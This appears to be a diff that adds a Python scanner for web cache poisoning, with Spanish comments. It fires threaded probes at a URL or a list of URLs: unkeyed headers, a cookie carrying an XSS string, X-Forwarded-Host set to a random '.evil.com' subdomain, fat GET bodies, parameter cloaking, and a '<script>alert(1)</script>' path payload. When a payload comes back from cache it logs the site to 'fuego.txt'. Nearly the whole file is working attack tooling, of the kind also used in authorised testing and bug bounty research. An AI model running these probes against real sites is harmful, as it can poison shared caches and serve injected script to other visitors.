@@ -1,0 +1,199 @@
+import requests
+import hashlib
+import random
+import string
+import sys
+import time
+from concurrent.futures import ThreadPoolExecutor
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+TIMEOUT = 10
+THREADS = 15
+OUTPUT_FILE = "fuego.txt"
+
+# =========================
+# UTILIDADES
+# =========================
+
+def random_cb():
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+
+def get_hash(content):
+    return hashlib.md5(content).hexdigest()
+
+def is_cache_hit(headers):
+    indicators = ["cf-cache-status", "x-cache", "x-proxy-cache", "age"]
+    for h, v in headers.items():
+        if h.lower() in indicators:
+            if "hit" in v.lower() or "cached" in v.lower() or h.lower() == "age":
+                return True
+    return False
+
+def safe_request(url, headers=None, method="GET", data=None):
+    try:
+        if method == "POST":
+            return requests.post(url, headers=headers or {}, data=data, timeout=TIMEOUT, verify=False, allow_redirects=False)
+        else:
+            return requests.get(url, headers=headers or {}, timeout=TIMEOUT, verify=False, allow_redirects=False)
+    except:
+        return None
+
+# =========================
+# TESTS AVANZADOS
+# =========================
+
+# 🔥 1. UNKEYED HEADER
+def test_header(url, header):
+    payload = f"pwn-{random_cb()}.com"
+    test_url = f"{url}?cb={random_cb()}"
+
+    r1 = safe_request(test_url, headers={header: payload})
+    if not r1:
+        return
+
+    reflected = payload in r1.text or payload in str(r1.headers)
+
+    if reflected:
+        time.sleep(1)
+        r2 = safe_request(test_url)
+
+        if r2 and payload in r2.text and is_cache_hit(r2.headers):
+            print(f"[🔥 HEADER POISON] {url} | {header}")
+            save(url, f"HEADER: {header}")
+
+# 🔥 2. UNKEYED COOKIE
+def test_cookie(url):
+    payload = f"xss\"-alert(1)-\""
+    test_url = f"{url}?cb={random_cb()}"
+
+    headers = {"Cookie": f"fehost={payload}"}
+    r1 = safe_request(test_url, headers=headers)
+
+    if r1 and payload in r1.text:
+        time.sleep(1)
+        r2 = safe_request(test_url)
+
+        if r2 and payload in r2.text and is_cache_hit(r2.headers):
+            print(f"[🔥 COOKIE POISON] {url}")
+            save(url, "COOKIE")
+
+# 🔥 3. MULTI HEADER (XFH + XFS)
+def test_multi_header(url):
+    payload = f"{random_cb()}.evil.com"
+    test_url = f"{url}?cb={random_cb()}"
+
+    headers = {
+        "X-Forwarded-Host": payload,
+        "X-Forwarded-Scheme": "http"
+    }
+
+    r = safe_request(test_url, headers=headers)
+
+    if r and payload in str(r.headers):
+        print(f"[🔥 MULTI HEADER] {url}")
+        save(url, "MULTI HEADER")
+
+# 🔥 4. FAT GET
+def test_fat_get(url):
+    payload = "callback=alert(1)"
+    test_url = f"{url}?callback=test"
+
+    r1 = safe_request(test_url, method="GET", data=payload)
+
+    if r1 and "alert(1)" in r1.text:
+        time.sleep(1)
+        r2 = safe_request(test_url)
+
+        if r2 and "alert(1)" in r2.text and is_cache_hit(r2.headers):
+            print(f"[🔥 FAT GET] {url}")
+            save(url, "FAT GET")
+
+# 🔥 5. PARAMETER CLOAKING
+def test_cloaking(url):
+    payload = "alert(1)"
+    test_url = f"{url}?callback=test&utm_content=x;callback={payload}"
+
+    r = safe_request(test_url)
+
+    if r and payload in r.text:
+        print(f"[🔥 PARAM CLOAKING] {url}")
+        save(url, "CLOAKING")
+
+# 🔥 6. URL NORMALIZATION
+def test_normalization(url):
+    payload = "<script>alert(1)</script>"
+    test_url = f"{url}/random{payload}"
+
+    r1 = safe_request(test_url)
+
+    if r1 and payload in r1.text:
+        encoded = requests.utils.quote(payload)
+        test_url2 = f"{url}/random{encoded}"
+
+        r2 = safe_request(test_url2)
+
+        if r2 and payload in r2.text and is_cache_hit(r2.headers):
+            print(f"[🔥 NORMALIZATION] {url}")
+            save(url, "NORMALIZATION")
+
+# =========================
+# GUARDAR RESULTADOS
+# =========================
+
+def save(url, vuln):
+    with open(OUTPUT_FILE, "a") as f:
+        f.write(f"{url} | {vuln}\n")
+
+# =========================
+# SCAN PRINCIPAL
+# =========================
+
+def scan(url, headers):
+    print(f"\n{'='*60}")
+    print(f"TARGET: {url}")
+    print(f"{'='*60}")
+
+    initial = safe_request(url)
+    if initial and is_cache_hit(initial.headers):
+        print("[+] Cache detectada")
+
+    # THREADS
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+
+        # headers clásicos
+        for h in headers:
+            executor.submit(test_header, url, h)
+
+        # técnicas avanzadas
+        executor.submit(test_cookie, url)
+        executor.submit(test_multi_header, url)
+        executor.submit(test_fat_get, url)
+        executor.submit(test_cloaking, url)
+        executor.submit(test_normalization, url)
+
+# =========================
+# MAIN
+# =========================
+
+if __name__ == "__main__":
+
+    if len(sys.argv) != 3:
+        print(f"Uso: python3 {sys.argv[0]} <url|lista> <headers.txt>")
+        sys.exit(1)
+
+    target_input = sys.argv[1]
+    header_file = sys.argv[2]
+
+    with open(header_file) as f:
+        headers_list = [line.strip() for line in f if line.strip()]
+
+    if target_input.startswith("http"):
+        urls = [target_input]
+    else:
+        with open(target_input) as f:
+            urls = [line.strip() for line in f if line.strip()]
+
+    for url in urls:
+        scan(url, headers_list)
